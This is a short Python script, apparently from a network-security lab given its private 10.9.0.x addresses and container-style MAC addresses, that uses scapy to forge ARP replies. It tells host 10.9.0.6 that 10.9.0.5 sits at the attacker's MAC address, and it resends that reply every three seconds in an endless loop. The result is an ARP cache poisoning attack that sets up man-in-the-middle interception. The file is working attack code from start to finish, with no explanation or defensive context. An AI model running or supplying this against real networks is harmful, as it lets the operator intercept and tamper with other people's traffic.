from time import sleep

from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import ARP


ether = Ether()
arp = ARP()


MAC_Attacker = '02:42:0a:09:00:69'
MAC_B = '02:42:0a:09:00:06'
IP_A = '10.9.0.5'
IP_B = '10.9.0.6'

ether.src = MAC_Attacker
ether.dst = MAC_B


arp.op = 2 # ARP REPLY


arp.hwsrc = MAC_Attacker
arp.hwdst = MAC_B
arp.psrc = IP_A
arp.pdst = IP_B
arp.hlen = 6
arp.plen = 4

pkt = ether / arp


while (True):
    sendp(pkt)
    sleep(3)
